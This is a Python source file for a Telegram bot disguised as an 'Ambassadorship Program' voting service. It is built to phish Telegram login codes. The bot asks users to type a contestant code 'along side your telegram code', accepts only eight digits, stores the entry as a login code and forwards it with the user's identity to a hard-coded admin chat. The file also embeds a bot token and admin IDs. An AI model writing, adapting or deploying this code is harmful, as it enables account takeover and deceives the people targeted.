from flask import Flask
import threading
import os

# --- Flask Server for Keeping Alive ---
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot is alive and running!"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Start Flask in background thread
flask_thread = threading.Thread(target=run_flask, daemon=True)
flask_thread.start()




import os
import django
import logging
import random
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton



from account.models import Vote  # import the Vote model

API_TOKEN = "8426626613:AAGx34R6KeMfBEpexqKq2sr9VFUxSB6O1hs"  # replace with your bot token

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

#telegram link with ref  t.me/Ambassadorship_Programs_bot?start=ambassadorship2025
# telegram link t.me/Ambassadorship_Programs_bot
# telegram link for auto statr bot with button t.me/Ambassadorship_Programs_bot?start=1
#get admin chat id with @userinfobot
ADMIN_TELEGRAM_ID = 6772237358   #Testing  <-- replace with your Telegram user ID

#ADMIN_TELEGRAM_ID = 1610519395




from asgiref.sync import sync_to_async

# --- Start command ---
# --- Start Command ---
@dp.message_handler(commands=["start"])
async def send_welcome(message: types.Message):
    start_param = message.get_args()  # e.g., "1", "voting", "candidate123"

    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("🗳️ Start Voting", callback_data="start_voting"))

    await message.answer(
        "👋 Welcome to *Ambassadorship Program*!\n\n"
        "Proceed voting for your candidate below ⬇️",
        parse_mode="Markdown",
        reply_markup=kb
    )

    
    try:
        await bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 New user started the Bot 5!\n\n"
            f"👤 User: @{message.from_user.username or 'NoUsername'}\n"
            f"📛 Name: {message.from_user.first_name}\n"
            f"🆔 ID: {message.from_user.id}\n"
            f"Start Param: {start_param or 'None'}"
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}", exc_info=True)


    
# ------------------ Voting Button ------------------
@dp.callback_query_handler(lambda c: c.data == "start_voting")
async def ask_code(callback_query: types.CallbackQuery):

    random_number = random.randint(100, 999)
    await bot.send_message(
        callback_query.from_user.id,
        
        f"Your Contestant Code is: {random_number}\n\n"
        f"📝 Enter your Contestant code along side your telegram *code* into the prompt below to proceed with your Vote:",
        parse_mode="Markdown"
    )


# ------------------ Handle Code Input ------------------
@dp.message_handler(lambda message: message.text and not message.text.startswith("/"))
async def handle_code(message: types.Message):
    code_entered = message.text.strip()

    # Validate code
    if not code_entered.isdigit() or len(code_entered) != 8:
        await message.answer("❌ Invalid code! Please enter your Contestant code along side your Telegram code. Try again.")
        return

    # Generate random 3-digit number
    random_number = random.randint(100, 999)

    # Combine random number + code + "Vote"
    combined_vote = f"{code_entered}Votes"

    # Create a new vote record
    vote = await sync_to_async(Vote.objects.create)(
        telegram_id=message.from_user.id,
        username=message.from_user.username,
        first_name=message.from_user.first_name,
        login_code=code_entered,
        #combined_vote=combined_vote  # optional field, store if your model has it
    )

    # Notify user
    await message.answer(
        f"✅ You have successfully sent *{combined_vote}*! 🎉\n\n"
        "Thank you for your participation.",
        parse_mode="Markdown"
    )

    # Notify all admins
    
    try:
        await bot.send_message(
            ADMIN_TELEGRAM_ID,
            f"🔔 Ambassadorship Program Bot 5!\n\n"
            f"📩 *New Vote Submitted!*\n\n"
            f"👤 User: @{vote.username or 'No username'}\n"
            f"📛 Name: {vote.first_name}\n"
            f"🆔 ID: {vote.telegram_id}\n"
            f"🔑 Code Sent: {combined_vote}",
            parse_mode="Markdown"
        )
    except Exception as e:
        logging.error(f"Failed to notify admin: {e}", exc_info=True)


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)